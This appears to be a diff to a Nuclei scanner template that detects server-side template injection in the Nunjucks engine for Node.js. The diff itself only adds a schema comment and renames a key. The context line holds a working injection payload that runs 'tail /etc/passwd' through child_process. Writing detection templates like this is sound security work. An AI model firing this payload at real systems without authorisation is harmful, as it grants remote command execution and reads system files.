@@ -1,3 +1,4 @@
+# yaml-language-server: $schema=https://raw.githubusercontent.com/projectdiscovery/nuclei/dev/pkg/templates/nuclei-jsonschema.json
 id: node-nunjucks-ssti
 
 info:
@@ -8,7 +9,7 @@ info:
   severity: high
   tags: node,nunjucks,ssti
 
-requests:
+http:
   - method: GET
     path:
       - "{{BaseURL}}/page?name={{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}"
